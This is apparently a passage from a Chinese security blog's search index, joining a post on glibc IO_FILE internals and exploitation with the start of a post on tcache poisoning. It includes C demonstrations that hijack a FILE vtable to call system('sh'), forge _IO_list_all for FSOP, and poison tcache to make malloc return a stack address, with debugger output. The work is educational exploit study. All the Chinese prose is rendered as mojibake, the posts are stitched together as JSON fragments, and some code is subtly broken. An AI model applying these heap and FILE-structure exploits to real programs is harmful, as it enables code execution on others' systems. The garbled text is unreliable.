åº“ä¸­ç”¨äºæ‰“å¼€æ–‡ä»¶ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ FILE *fopen(char *filename, *type); filename: ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„ type: æ‰“å¼€æ–¹å¼çš„ç±»å‹ è¿”å›å€¼: è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ åœ¨ fopen å†…éƒ¨ä¼šåˆ›å»º FILE ç»“æ„å¹¶è¿›è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä¸‹é¢æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ é¦–å…ˆåœ¨ fopen å¯¹åº”çš„å‡½æ•°_fopen_internal å†…éƒ¨ä¼šè°ƒç”¨ malloc å‡½æ•°ï¼Œåˆ†é… FILE ç»“æ„çš„ç©ºé—´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è·çŸ¥ FILE ç»“æ„æ˜¯å­˜å‚¨åœ¨å †ä¸Šçš„ *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); ä¹‹åä¼šä¸ºåˆ›å»ºçš„ FILE åˆå§‹åŒ– vtableï¼Œå¹¶è°ƒç”¨_IO_file_init è¿›ä¸€æ­¥åˆå§‹åŒ–æ“ä½œ _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;_IO_file_init (&amp;new_f-&gt;fp); åœ¨_IO_file_init å‡½æ•°çš„åˆå§‹åŒ–æ“ä½œä¸­ï¼Œä¼šè°ƒç”¨_IO_link_in æŠŠæ–°åˆ†é…çš„ FILE é“¾å…¥_IO_list_all ä¸ºèµ·å§‹çš„ FILE é“¾è¡¨ä¸­ void_IO_link_in (fp) struct _IO_FILE_plus *fp;{ if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0) { fp-&gt;file._flags |= _IO_LINKED; fp-&gt;file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; }} ä¹‹å_fopen_internal å‡½æ•°ä¼šè°ƒç”¨_IO_file_fopen å‡½æ•°æ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œ_IO_file_fopen ä¼šæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„æ‰“å¼€æ¨¡å¼è¿›è¡Œæ‰“å¼€æ“ä½œï¼Œæ€»ä¹‹æœ€åä¼šè°ƒç”¨åˆ°ç³»ç»Ÿæ¥å£ open å‡½æ•°ï¼Œè¿™é‡Œä¸å†æ·±å…¥ã€‚ if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file); æ€»ç»“ä¸€ä¸‹ fopen çš„æ“ä½œæ˜¯ ä½¿ç”¨ malloc åˆ†é… FILE ç»“æ„ è®¾ç½® FILE ç»“æ„çš„ vtable åˆå§‹åŒ–åˆ†é…çš„ FILE ç»“æ„ å°†åˆå§‹åŒ–çš„ FILE ç»“æ„é“¾å…¥ FILE ç»“æ„é“¾è¡¨ä¸­ è°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶ fclosefclose æ˜¯æ ‡å‡† IO åº“ä¸­ç”¨äºå…³é—­å·²æ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼Œå…¶ä½œç”¨ä¸ fopen ç›¸åã€‚ int fclose(FILE *stream) åŠŸèƒ½ï¼šå…³é—­ä¸€ä¸ªæ–‡ä»¶æµï¼Œä½¿ç”¨ fclose å°±å¯ä»¥æŠŠç¼“å†²åŒºå†…æœ€åå‰©ä½™çš„æ•°æ®è¾“å‡ºåˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œå¹¶é‡Šæ”¾æ–‡ä»¶æŒ‡é’ˆå’Œæœ‰å…³çš„ç¼“å†²åŒº fclose é¦–å…ˆä¼šè°ƒç”¨_IO_unlink_it å°†æŒ‡å®šçš„ FILE ä»_chain é“¾è¡¨ä¸­è„±é“¾ if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); ä¹‹åä¼šè°ƒç”¨_IO_file_close_it å‡½æ•°ï¼Œ_IO_file_close_it ä¼šè°ƒç”¨ç³»ç»Ÿæ¥å£ close å…³é—­æ–‡ä»¶ if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); æœ€åè°ƒç”¨ vtable ä¸­çš„_IO_FINISHï¼Œå…¶å¯¹åº”çš„æ˜¯_IO_file_finish å‡½æ•°ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ free å‡½æ•°é‡Šæ”¾ä¹‹å‰åˆ†é…çš„ FILE ç»“æ„ _IO_FINISH (fp); printf/putsprintf å’Œ puts æ˜¯å¸¸ç”¨çš„è¾“å‡ºå‡½æ•°ï¼Œåœ¨ printf çš„å‚æ•°æ˜¯ä»¥\\nç»“æŸçš„çº¯å­—ç¬¦ä¸²æ—¶ï¼Œprintf ä¼šè¢«ä¼˜åŒ–ä¸º puts å‡½æ•°å¹¶å»é™¤æ¢è¡Œç¬¦ã€‚ puts åœ¨æºç ä¸­å®ç°çš„å‡½æ•°æ˜¯_IO_putsï¼Œè¿™ä¸ªå‡½æ•°çš„æ“ä½œä¸ fwrite çš„æµç¨‹å¤§è‡´ç›¸åŒï¼Œå‡½æ•°å†…éƒ¨åŒæ ·ä¼šè°ƒç”¨ vtable ä¸­çš„_IO_sputnï¼Œç»“æœä¼šæ‰§è¡Œ_IO_new_file_xsputnï¼Œæœ€åä¼šè°ƒç”¨åˆ°ç³»ç»Ÿæ¥å£ write å‡½æ•°ã€‚ printf çš„è°ƒç”¨æ ˆå›æº¯å¦‚ä¸‹ï¼ŒåŒæ ·æ˜¯é€šè¿‡_IO_file_xsputn å®ç° vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite ä¸‹é¢è®°å½•ä¸€äº›æ”»å‡»æŠ€æœ¯ã€‚ ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ç®€ä»‹å‰é¢æˆ‘ä»¬ä»‹ç»äº† Linux ä¸­æ–‡ä»¶æµçš„ç‰¹æ€§ï¼ˆFILEï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ Linux ä¸­çš„ä¸€äº›å¸¸è§çš„ IO æ“ä½œå‡½æ•°éƒ½éœ€è¦ç»è¿‡ FILE ç»“æ„è¿›è¡Œå¤„ç†ã€‚å°¤å…¶æ˜¯_IO_FILE_plus ç»“æ„ä¸­å­˜åœ¨ vtableï¼Œä¸€äº›å‡½æ•°ä¼šå–å‡º vtable ä¸­çš„æŒ‡é’ˆè¿›è¡Œè°ƒç”¨ã€‚ å› æ­¤ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹çš„ä¸­å¿ƒæ€æƒ³å°±æ˜¯é’ˆå¯¹_IO_FILE_plus çš„ vtable åŠ¨æ‰‹è„šï¼Œé€šè¿‡æŠŠ vtable æŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œå¹¶åœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆæ¥å®ç°ã€‚ å› æ­¤ vtable åŠ«æŒåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯ç›´æ¥æ”¹å†™ vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡ä»»æ„åœ°å€å†™å°±å¯ä»¥å®ç°ã€‚å¦ä¸€ç§æ˜¯è¦†ç›– vtable çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œç„¶ååœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆã€‚ ç¤ºä¾‹è¿™é‡Œæ¼”ç¤ºäº†ä¿®æ”¹ vtable ä¸­çš„æŒ‡é’ˆï¼Œé¦–å…ˆéœ€è¦çŸ¥é“_IO_FILE_plus ä½äºå“ªé‡Œï¼Œå¯¹äº fopen çš„æƒ…å†µæ˜¯ä½äºå †å†…å­˜ï¼Œå¯¹äº stdin\\stdout\\stderr æ˜¯ä½äº libc.so ä¸­ã€‚ int main(void){ FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\");} æ ¹æ® vtable åœ¨_IO_FILE_plus çš„åç§»å¾—åˆ° vtable çš„åœ°å€ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸‹åç§»æ˜¯ 0xd8ã€‚ä¹‹åéœ€è¦ææ¸…æ¥šæ¬²åŠ«æŒçš„ IO å‡½æ•°ä¼šè°ƒç”¨ vtable ä¸­çš„å“ªä¸ªå‡½æ•°ã€‚å…³äº IO å‡½æ•°è°ƒç”¨ vtable çš„æƒ…å†µå·²ç»åœ¨ FILE ç»“æ„ä»‹ç»ä¸€èŠ‚ç»™å‡ºäº†ï¼ŒçŸ¥é“äº† printf ä¼šè°ƒç”¨ vtable ä¸­çš„ xsputnï¼Œå¹¶ä¸” xsputn æ˜¯ vtable ä¸­çš„ç¬¬å…«é¡¹ä¹‹åå°±å¯ä»¥å†™å…¥è¿™ä¸ªæŒ‡é’ˆè¿›è¡ŒåŠ«æŒã€‚ å¹¶ä¸”åœ¨ xsputn ç­‰ vtable å‡½æ•°è¿›è¡Œè°ƒç”¨æ—¶ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å…¶å®æ˜¯å¯¹åº”çš„_IO_FILE_plus åœ°å€ã€‚æ¯”å¦‚è¿™ä¾‹å­è°ƒç”¨ printfï¼Œä¼ é€’ç»™ vtable çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯_IO_2_1_stdout_çš„åœ°å€ã€‚ åˆ©ç”¨è¿™ç‚¹å¯ä»¥å®ç°ç»™åŠ«æŒçš„ vtable å‡½æ•°ä¼ åƒï¼Œæ¯”å¦‚ï¼š #define system_ptr 0x7ffff7a52390;int main(void){ FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,\"sh\",3); vtable_ptr[7]=system_ptr //xsputn fwrite(\"hi\",2,1,fp);} ä½†æ˜¯åœ¨ç›®å‰ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œä½äº libc æ•°æ®æ®µçš„ vtable æ˜¯ä¸å¯ä»¥è¿›è¡Œå†™å…¥çš„ã€‚ä¸è¿‡ï¼Œé€šè¿‡åœ¨å¯æ§çš„å†…å­˜ä¸­ä¼ªé€  vtable çš„æ–¹æ³•ä¾ç„¶å¯ä»¥å®ç°åˆ©ç”¨ã€‚ #define system_ptr 0x7ffff7a52390;int main(void){ FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp);} æˆ‘ä»¬é¦–å…ˆåˆ†é…ä¸€æ¬¾å†…å­˜æ¥å­˜æ”¾ä¼ªé€ çš„ vtableï¼Œä¹‹åä¿®æ”¹_IO_FILE_plus çš„ vtable æŒ‡é’ˆæŒ‡å‘è¿™å—å†…å­˜ã€‚å› ä¸º vtable ä¸­çš„æŒ‡é’ˆæˆ‘ä»¬æ”¾ç½®çš„æ˜¯ system å‡½æ•°çš„åœ°å€ï¼Œå› æ­¤éœ€è¦ä¼ é€’å‚æ•° â€œ/bin/shâ€ æˆ– â€œshâ€ã€‚ å› ä¸º vtable ä¸­çš„å‡½æ•°è°ƒç”¨æ—¶ä¼šæŠŠå¯¹åº”çš„_IO_FILE_plus æŒ‡é’ˆä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬æŠŠ â€œshâ€ å†™å…¥_IO_FILE_plus å¤´éƒ¨ã€‚ä¹‹åå¯¹ fwrite çš„è°ƒç”¨å°±ä¼šç»è¿‡æˆ‘ä»¬ä¼ªé€ çš„ vtable æ‰§è¡Œ system(â€œshâ€)ã€‚ åŒæ ·ï¼Œå¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨ fopen ç­‰å‡½æ•°åˆ›å»ºçš„_IO_FILE æ—¶ï¼Œä¹Ÿå¯ä»¥é€‰æ‹© stdin\\stdout\\stderr ç­‰ä½äº libc.so ä¸­çš„_IO_FILEï¼Œè¿™äº›æµåœ¨ printf\\scanf ç­‰å‡½æ•°ä¸­å°±ä¼šè¢«ä½¿ç”¨åˆ°ã€‚åœ¨ libc2.23 ä¹‹å‰ï¼Œè¿™äº› vtable æ˜¯å¯ä»¥å†™å…¥å¹¶ä¸”ä¸å­˜åœ¨å…¶ä»–æ£€æµ‹çš„ã€‚ print &amp;_IO_2_1_stdin_$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so FSOPç®€ä»‹FSOP æ˜¯ File Stream Oriented Programming çš„ç¼©å†™ï¼Œæ ¹æ®å‰é¢å¯¹ FILE çš„ä»‹ç»å¾—çŸ¥è¿›ç¨‹å†…æ‰€æœ‰çš„_IO_FILE ç»“æ„ä¼šä½¿ç”¨_chain åŸŸç›¸äº’è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œè¿™ä¸ªé“¾è¡¨çš„å¤´éƒ¨ç”±_IO_list_all ç»´æŠ¤ã€‚ FSOP çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ_IO_list_all çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„_IO_FILE é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚FSOP é€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°_IO_list_all é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª FILE è°ƒç”¨ fflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨_IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚ int_IO_flush_all_lockp (int do_lock){ ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... }} è€Œ_IO_flush_all_lockp ä¸éœ€è¦æ”»å‡»è€…æ‰‹åŠ¨è°ƒç”¨ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹è¿™ä¸ªå‡½æ•°ä¼šè¢«ç³»ç»Ÿè°ƒç”¨ï¼š 1ã€å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶ 2ã€å½“æ‰§è¡Œ exit å‡½æ•°æ—¶ 3ã€å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶ ç¤ºä¾‹æ¢³ç†ä¸€ä¸‹ FSOP åˆ©ç”¨çš„æ¡ä»¶ï¼Œé¦–å…ˆéœ€è¦æ”»å‡»è€…è·çŸ¥ libc.so åŸºå€ï¼Œå› ä¸º_IO_list_all æ˜¯ä½œä¸ºå…¨å±€å˜é‡å‚¨å­˜åœ¨ libc.so ä¸­çš„ï¼Œä¸æ³„æ¼ libc åŸºå€å°±ä¸èƒ½æ”¹å†™_IO_list_allã€‚ ä¹‹åéœ€è¦ç”¨ä»»æ„åœ°å€å†™æŠŠ_IO_list_all çš„å†…å®¹æ”¹ä¸ºæŒ‡å‘æˆ‘ä»¬å¯æ§å†…å­˜çš„æŒ‡é’ˆï¼Œ ä¹‹åçš„é—®é¢˜æ˜¯åœ¨å¯æ§å†…å­˜ä¸­å¸ƒç½®ä»€ä¹ˆæ•°æ®ï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯éœ€è¦å¸ƒç½®ä¸€ä¸ªæˆ‘ä»¬ç†æƒ³å‡½æ•°çš„ vtable æŒ‡é’ˆã€‚ä½†æ˜¯ä¸ºäº†èƒ½å¤Ÿè®©æˆ‘ä»¬æ„é€ çš„ fake_FILE èƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼Œè¿˜éœ€è¦å¸ƒç½®ä¸€äº›å…¶ä»–æ•°æ®ã€‚ è¿™é‡Œçš„ä¾æ®æ˜¯æˆ‘ä»¬å‰é¢ç»™å‡ºçš„ if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ä¹Ÿå°±æ˜¯ï¼š fp-&gt;_mode &lt;= 0 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base åœ¨è¿™é‡Œé€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥éªŒè¯è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆæˆ‘ä»¬åˆ†é…ä¸€å—å†…å­˜ç”¨äºå­˜æ”¾ä¼ªé€ çš„ vtable å’Œ_IO_FILE_plusã€‚ ä¸ºäº†ç»•è¿‡éªŒè¯ï¼Œæˆ‘ä»¬æå‰è·å¾—äº†_IO_write_ptrã€_IO_write_baseã€_mode ç­‰æ•°æ®åŸŸçš„åç§»ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¼ªé€ çš„ vtable ä¸­æ„é€ ç›¸åº”çš„æ•°æ® #define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define writeptr_offset 0x28#define writebase_offset 0x20#define vtable_offset 0xd8int main(void){ void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0);} æˆ‘ä»¬ä½¿ç”¨åˆ†é…å†…å­˜çš„å‰ 0x100 ä¸ªå­—èŠ‚ä½œä¸º_IO_FILEï¼Œå 0x100 ä¸ªå­—èŠ‚ä½œä¸º vtableï¼Œåœ¨ vtable ä¸­ä½¿ç”¨ 0x41414141 è¿™ä¸ªåœ°å€ä½œä¸ºä¼ªé€ çš„_IO_overflow æŒ‡é’ˆã€‚ ä¹‹åï¼Œè¦†ç›–ä½äº libc ä¸­çš„å…¨å±€å˜é‡ _IO_list_allï¼ŒæŠŠå®ƒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„_IO_FILE_plusã€‚ é€šè¿‡è°ƒç”¨ exit å‡½æ•°ï¼Œç¨‹åºä¼šæ‰§è¡Œ _IO_flush_all_lockpï¼Œç»è¿‡ fflush è·å–_IO_list_all çš„å€¼å¹¶å–å‡ºä½œä¸º_IO_FILE_plus è°ƒç”¨å…¶ä¸­çš„_IO_overflow ---&gt; call _IO_overflow[#0] 0x7ffff7a89193 â†’ Name: _IO_flush_all_lockp(do_lock=0x0)[#1] 0x7ffff7a8932a â†’ Name: _IO_cleanup()[#2] 0x7ffff7a46f9b â†’ Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)[#3] 0x7ffff7a47045 â†’ Name: __GI_exit(status=&lt;optimized out&gt;)[#4] 0x4005ce â†’ Name: main() glibc 2.24 ä¸‹ IO_FILE çš„åˆ©ç”¨åœ¨ 2.24 ç‰ˆæœ¬çš„ glibc ä¸­ï¼Œå…¨æ–°åŠ å…¥äº†é’ˆå¯¹ IO_FILE_plus çš„ vtable åŠ«æŒçš„æ£€æµ‹æªæ–½ï¼Œglibc ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ vtable åœ°å€çš„åˆæ³•æ€§ã€‚é¦–å…ˆä¼šéªŒè¯ vtable æ˜¯å¦ä½äº_IO_vtable æ®µä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨_IO_vtable_check åšè¿›ä¸€æ­¥æ£€æŸ¥ã€‚ /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */void _IO_vtable_check (void) attribute_hidden;/* Perform vtable pointer validation. If validation fails, terminate the process. */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){ /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; uintptr_t ptr = (uintptr_t) vtable; uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;} è®¡ç®— section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;ï¼Œç´§æ¥ç€ä¼šåˆ¤æ–­ vtable - __start___libc_IO_vtables çš„ offset ï¼Œå¦‚æœè¿™ä¸ª offset å¤§äº section_length , å³å¤§äº __stop___libc_IO_vtables - __start___libc_IO_vtables é‚£ä¹ˆå°±ä¼šè°ƒç”¨ _IO_vtable_check() è¿™ä¸ªå‡½æ•°ã€‚ void attribute_hidden_IO_vtable_check (void){#ifdef SHARED /* Honor the compatibility flag. */ void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE PTR_DEMANGLE (flag);#endif if (flag == &amp;_IO_vtable_check) return; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) return; }#else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if (__dlopen != NULL) return;#endif __libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\");} å¦‚æœ vtable æ˜¯éæ³•çš„ï¼Œé‚£ä¹ˆä¼šå¼•å‘ abortã€‚ è¿™é‡Œçš„æ£€æŸ¥ä½¿å¾—ä»¥å¾€ä½¿ç”¨ vtable è¿›è¡Œåˆ©ç”¨çš„æŠ€æœ¯å¾ˆéš¾å®ç°ï¼Œä¸è¿‡å­˜åœ¨æ–°çš„åˆ©ç”¨æŠ€æœ¯ã€‚ fileno ä¸ç¼“å†²åŒºçš„ç›¸å…³åˆ©ç”¨åœ¨ vtable éš¾ä»¥è¢«åˆ©ç”¨ä¹‹åï¼Œåˆ©ç”¨çš„å…³æ³¨ç‚¹ä» vtable è½¬ç§»åˆ°_IO_FILE ç»“æ„å†…éƒ¨çš„åŸŸä¸­ã€‚ å‰é¢ä»‹ç»è¿‡_IO_FILE åœ¨ä½¿ç”¨æ ‡å‡† IO åº“æ—¶ä¼šè¿›è¡Œåˆ›å»ºå¹¶è´Ÿè´£ç»´æŠ¤ä¸€äº›ç›¸å…³ä¿¡æ¯ï¼Œå…¶ä¸­æœ‰ä¸€äº›åŸŸæ˜¯è¡¨ç¤ºè°ƒç”¨è¯¸å¦‚ fwriteã€fread ç­‰å‡½æ•°æ—¶å†™å…¥åœ°å€æˆ–è¯»å–åœ°å€çš„ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶è¿™äº›æ•°æ®å°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™æˆ–ä»»æ„åœ°å€è¯»ã€‚ struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it's too small. */}; å› ä¸ºè¿›ç¨‹ä¸­åŒ…å«äº†ç³»ç»Ÿé»˜è®¤çš„ä¸‰ä¸ªæ–‡ä»¶æµ stdin\\stdout\\stderrï¼Œå› æ­¤è¿™ç§æ–¹å¼å¯ä»¥ä¸éœ€è¦è¿›ç¨‹ä¸­å­˜åœ¨æ–‡ä»¶æ“ä½œï¼Œé€šè¿‡ scanf\\printf ä¸€æ ·å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚ åœ¨_IO_FILE ä¸­_IO_buf_base è¡¨ç¤ºæ“ä½œçš„èµ·å§‹åœ°å€ï¼Œ_IO_buf_end è¡¨ç¤ºç»“æŸåœ°å€ï¼Œé€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªæ•°æ®å¯ä»¥å®ç°æ§åˆ¶è¯»å†™çš„æ“ä½œã€‚","link":"/2020/06/14/IO-FILE%E7%9B%B8%E5%85%B3/"},{"title":"å †æº¢å‡º-Tcache_Attack","text":"tcache æ˜¯ glibc 2.26 (ubuntu 17.10) ä¹‹åå¼•å…¥çš„ä¸€ç§æŠ€æœ¯ï¼Œç›®çš„æ˜¯æå‡å †ç®¡ç†çš„æ€§èƒ½ã€‚ä½†æå‡æ€§èƒ½çš„åŒæ—¶èˆå¼ƒäº†å¾ˆå¤šå®‰å…¨æ£€æŸ¥ï¼Œä¹Ÿå› æ­¤æœ‰äº†å¾ˆå¤šæ–°çš„åˆ©ç”¨æ–¹å¼ã€‚å¯¹ tcache çš„æ·±å…¥è®¤è¯†å»è¿™é‡Œã€‚è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹å¦‚ä½• PWN tcacheã€‚ tcache poisoningå³ tcache æ±¡æŸ“ï¼Œé€šè¿‡è¦†ç›– tcache ä¸­çš„ nextï¼Œä¸éœ€è¦ä¼ªé€ ä»»ä½• chunk ç»“æ„å³å¯å®ç° malloc åˆ°ä»»ä½•åœ°å€ã€‚ä»¥ how2heap ä¸­çš„ tcache_poisoning ä¸ºä¾‹ï¼Œä»£ç å¦‚ä¸‹ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main(){ // disable buffering setbuf(stdin, NULL); setbuf(stdout, NULL); printf(\"This file demonstrates a simple tcache poisoning attack by tricking malloc into\\n\" \"returning a pointer to an arbitrary location (in this case, the stack).\\n\" \"The attack is very similar to fastbin corruption attack.\\n\"); printf(\"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\\n\" \"We have to create and free one more chunk for padding before fd pointer hijacking.\\n\\n\"); size_t stack_var; printf(\"The address we want malloc() to return is %p.\\n\", (char *)&amp;stack_var); printf(\"Allocating 2 buffers.\\n\"); intptr_t *a = malloc(128); printf(\"malloc(128): %p\\n\", a); intptr_t *b = malloc(128); printf(\"malloc(128): %p\\n\", b); printf(\"Freeing the buffers...\\n\"); free(a); free(b); printf(\"Now the tcache list has [ %p -&gt; %p ].\\n\", b, a); printf(\"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n\" \"to point to the location to control (%p).\\n\", sizeof(intptr_t), b, &amp;stack_var); b[0] = (intptr_t)&amp;stack_var; printf(\"Now the tcache list has [ %p -&gt; %p ].\\n\", b, &amp;stack_var); printf(\"1st malloc(128): %p\\n\", malloc(128)); printf(\"Now the tcache list has [ %p ].\\n\", &amp;stack_var); intptr_t *c = malloc(128); printf(\"2nd malloc(128): %p\\n\", c); printf(\"We got the control\\n\"); return 0;} è¾“å…¥å¦‚ä¸‹ï¼š glibc_2.26 [masterâ—] ./tcache_poisoning This file demonstrates a simple tcache poisoning attack by tricking malloc intoreturning a pointer to an arbitrary location (in this case, the stack).The attack is very similar to fastbin corruption attack.The address we want malloc() to return is 0x7fff0d28a0c8.Allocating 1 buffer.malloc(128): 0x55f666ee1260Freeing the buffer...Now the tcache list has [ 0x55f666ee1260 ].We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260to point to the location to control 